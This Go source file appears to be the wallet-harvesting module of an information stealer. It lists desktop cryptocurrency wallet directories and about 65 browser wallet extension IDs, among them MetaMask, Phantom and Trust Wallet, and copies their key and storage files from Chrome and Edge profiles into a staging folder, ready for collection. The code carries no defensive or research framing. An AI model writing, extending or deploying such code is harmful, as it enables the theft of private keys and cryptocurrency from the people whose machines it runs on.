package wallets

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
)

var walletPaths = map[string]string{
	"Armory":   filepath.Join(os.Getenv("APPDATA"), "Armory"),
	"Atomic":   filepath.Join(os.Getenv("APPDATA"), "Atomic", "Local Storage", "leveldb"),
	"Bitcoin":  filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallets"),
	"Bytecoin": filepath.Join(os.Getenv("APPDATA"), "bytecoin"),
	"Coinomi":  filepath.Join(os.Getenv("LOCALAPPDATA"), "Coinomi", "Coinomi", "wallets"),
	"Dash":     filepath.Join(os.Getenv("APPDATA"), "DashCore", "wallets"),
	"Electrum": filepath.Join(os.Getenv("APPDATA"), "Electrum", "wallets"),
	"Ethereum": filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"),
	"Exodus":   filepath.Join(os.Getenv("APPDATA"), "Exodus", "exodus.wallet"),
	"Guarda":   filepath.Join(os.Getenv("APPDATA"), "Guarda", "Local Storage", "leveldb"),
	"Jaxx":     filepath.Join(os.Getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
	"Litecoin": filepath.Join(os.Getenv("APPDATA"), "Litecoin", "wallets"),
	"MyMonero": filepath.Join(os.Getenv("APPDATA"), "MyMonero"),
	"Monero":   filepath.Join(os.Getenv("APPDATA"), "Monero"),
	"Zcash":    filepath.Join(os.Getenv("APPDATA"), "Zcash"),
}

// ExtractWalletFiles extracts specific wallet files to destination directory
func ExtractWalletFiles(baseDir string) error {
	// Create base wallet directory
	walletsDir := filepath.Join(baseDir, "Wallets")
	if err := os.MkdirAll(walletsDir, 0755); err != nil {
		return fmt.Errorf("failed to create wallets directory: %v", err)
	}

	// Use WaitGroup for concurrent processing
	var wg sync.WaitGroup
	errChan := make(chan error, len(walletPaths))

	// Process each wallet
	for walletName, sourcePath := range walletPaths {
		wg.Add(1)
		go func(name, path string) {
			defer wg.Done()

			// Check if source path exists
			if _, err := os.Stat(path); os.IsNotExist(err) {
				return // Skip non-existent wallet paths
			}

			// Create wallet-specific destination directory
			destWalletDir := filepath.Join(walletsDir, name)
			if err := os.MkdirAll(destWalletDir, 0755); err != nil {
				errChan <- fmt.Errorf("failed to create %s wallet directory: %v", name, err)
				return
			}

			// Read directory contents
			entries, err := os.ReadDir(path)
			if err != nil {
				errChan <- fmt.Errorf("failed to read %s wallet directory: %v", name, err)
				return
			}

			// Copy each file
			for _, entry := range entries {
				if entry.IsDir() {
					continue // Skip subdirectories
				}

				sourceFilePath := filepath.Join(path, entry.Name())
				destFilePath := filepath.Join(destWalletDir, entry.Name())

				// Copy file
				if err := copyFile(sourceFilePath, destFilePath); err != nil {
					errChan <- fmt.Errorf("failed to copy %s wallet file %s: %v",
						name, entry.Name(), err)
				}
			}
		}(walletName, sourcePath)
	}

	// Wait for all goroutines to complete
	go func() {
		wg.Wait()
		close(errChan)
	}()

	// Collect first error if any
	for err := range errChan {
		return err
	}

	return nil
}

// copyFile copies a single file from source to destination
func copyFile(sourcePath, destPath string) error {
	// Open source file
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	// Create destination file
	destFile, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer destFile.Close()

	// Copy file contents
	_, err = io.Copy(destFile, sourceFile)
	return err
}

var walletExtensions = map[string]string{
	"dlcobpjiigpikoobohmabehhmhfoodbb": "Argent X",
	"jiidiaalihmmhddjgbnbgdfflelocpak": "BitKeep Wallet",
	"bopcbmipnjdcdfflfgjdgdjejmgpoaab": "BlockWallet",
	"odbfpeeihdkbihmopkbjmoonfanlbfcl": "Coinbase",
	"hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com",
	"kkpllkodjeloidieedojogacfhpaihoh": "Enkrypt",
	"mcbigmjiafegjnnogedioegffbooigli": "Ethos Sui",
	"aholpfdialjgjfhomihkjbmgjidlcdno": "ExodusWeb3",
	"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
	"afbcbjpbpfadlkmhmclhkeeodmamcflc": "MathWallet",
	"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
	"jnmbobjmhlngoefaiojfljckilhhlhcj": "OneKey",
	"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
	"lgmpcpglpngdoalbgeoldeajfclnhafa": "SafePal",
	"mfgccjchihfkkindfppnaooecgfneiii": "TokenPocket",
	"nphplpgoakhhjchkkhmiggakijnkhfnd": "Ton",
	"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
	"heamnjbnflcikcggoiplibfommfbkjpj": "Zeal",
	"jagohholfbnaombfgmademhogekljklp": "Binance Smart Chain",
	"bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
	"fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
	"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "Bitapp",
	"aodkkagnadcbobfpggfnjeongemjbjca": "BoltX",
	"aeachknmefphepccionboohckonoeemg": "Coin98",
	"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
	"agoakfejjabomempkjlepdflaleeobhb": "Core",
	"pnlfjmlcjdjgkddecgincndfgegkecke": "Crocobit",
	"blnieiiffboillknjnepogjhkgnoapac": "Equal",
	"cgeeodpfagjceefieflmdfphplkenlfk": "Ever",
	"ebfidpplhabeedpnhjnobghokpiioolj": "Fewcha",
	"cjmkndjhnagcfbpiemnkdpomccnjblmj": "Finnie",
	"nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild",
	"fnnegphlobjdpkhecapkijjdkgcjhkib": "HarmonyOutdated",
	"flpiciilemghbmfalicajoolhkkenfel": "Iconex",
	"cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
	"jblndlipeogpafnldhgmapagcccfchpi": "Kaikas",
	"pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
	"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
	"kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
	"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEWCX",
	"dngmlblcodfobpdpecaadgfbcggfjfnm": "MaiarDEFI",
	"efbglgofoippbgcjepnhiblaibcnclgk": "Martian",
	"nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
	"ejbalbakoplchlghecdalmeeeajnimhm": "Metamask2",
	"fcckkdbjnoikooededlapcalpionmalo": "Mobox",
	"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
	"jbdaocneiiinmjbjlgalhcelgbejmnid": "Nifty",
	"fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
	"mgffkfbidihjpoaomajlbgchddlicgpn": "PaliWallet",
	"ejjladinnckdgjemekebdpeokbikhfci": "Petra",
	"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
	"phkbamefinggmakgklpkljjmgibohnba": "Pontem",
	"nkddgncdjgjfcddamfgcmfnlhccnimig": "Saturn",
	"pocmplpaccanhmnllbbkpgfliimjljgo": "Slope",
	"bhhhlbepdkbapadjdnnojkbgioiodbic": "Solfare",
	"fhmfendgdocmcbmfikdcogofphimnkno": "Sollet",
	"mfhbebgoclkghebffdldpobeajmbecfk": "Starcoin",
	"cmndjbecilbocjfkibfbifhngkdmjgog": "Swash",
	"ookjlbkiijinhpmnjffcofjonbfbgaoc": "TempleTezos",
	"aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
	"ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
	"egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
	"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
	"eigblbgjknlfbajkfhopmcojidlgcehm": "XMR.PT",
	"bocpokimicclpaiekenaeelehdjllofo": "XinPay",
	"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
	"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
	"epapihdplajcdnnkdeiahlgigofloibg": "Sender",
}

func ExtractWalletExtensions(baseDir string) error {
	// Chrome and Edge extension settings paths
	extensionPaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Extension Settings"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings"),
	}

	// Create extensions directory
	extensionsDir := filepath.Join(baseDir, "WalletExtensions")
	if err := os.MkdirAll(extensionsDir, 0755); err != nil {
		return err
	}

	// Concurrent extension extraction
	var wg sync.WaitGroup
	errChan := make(chan error, len(walletExtensions))
	foundExtensions := 0

	for extensionID, walletName := range walletExtensions {
		wg.Add(1)
		go func(id, name string) {
			defer wg.Done()

			for _, basePath := range extensionPaths {
				extensionPath := filepath.Join(basePath, id)

				// Check if extension exists
				if _, err := os.Stat(extensionPath); os.IsNotExist(err) {
					continue
				}

				// Destination for this extension
				destPath := filepath.Join(extensionsDir, name)

				// Attempt to copy extension data
				if err := concurrentCopy(extensionPath, destPath); err != nil {
					errChan <- fmt.Errorf("failed to extract %s extension: %v", name, err)
					return
				}

				// Track found extensions
				foundExtensions++
				fmt.Printf("Found and extracted wallet extension: %s\n", name)
			}
		}(extensionID, walletName)
	}

	// Wait for all extractions to complete
	go func() {
		wg.Wait()
		close(errChan)
	}()

	// Collect and return first error if any
	for err := range errChan {
		return err
	}

	// Print summary
	fmt.Printf("Total wallet extensions found and extracted: %d\n", foundExtensions)

	return nil
}

// concurrentCopy implements advanced file copying with concurrency and error handling
func concurrentCopy(src, dst string) error {
	// Ensure destination directory exists
	if err := os.MkdirAll(dst, 0755); err != nil {
		return err
	}

	// Use WaitGroup for concurrent operations
	var wg sync.WaitGroup

	// Error channel for capturing concurrent errors
	errChan := make(chan error, 10)

	// Walk through source directory
	err := filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Get relative path
		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		// Construct destination path
		destPath := filepath.Join(dst, relPath)

		// Concurrent file/directory copy
		wg.Add(1)
		go func(sourcePath, destPath string, isDir bool) {
			defer wg.Done()

			if isDir {
				// Create directory
				if err := os.MkdirAll(destPath, 0755); err != nil {
					errChan <- fmt.Errorf("failed to create directory %s: %v", destPath, err)
					return
				}
			} else {
				// Copy file with error handling
				sourceData, err := os.ReadFile(sourcePath)
				if err != nil {
					errChan <- fmt.Errorf("failed to read %s: %v", sourcePath, err)
					return
				}

				if err := os.WriteFile(destPath, sourceData, 0644); err != nil {
					errChan <- fmt.Errorf("failed to write %s: %v", destPath, err)
					return
				}
			}
		}(path, destPath, info.IsDir())

		return nil
	})

	// Wait for all goroutines to complete
	go func() {
		wg.Wait()
		close(errChan)
	}()

	// Collect and return first error if any
	for err := range errChan {
		return err
	}

	return err
}
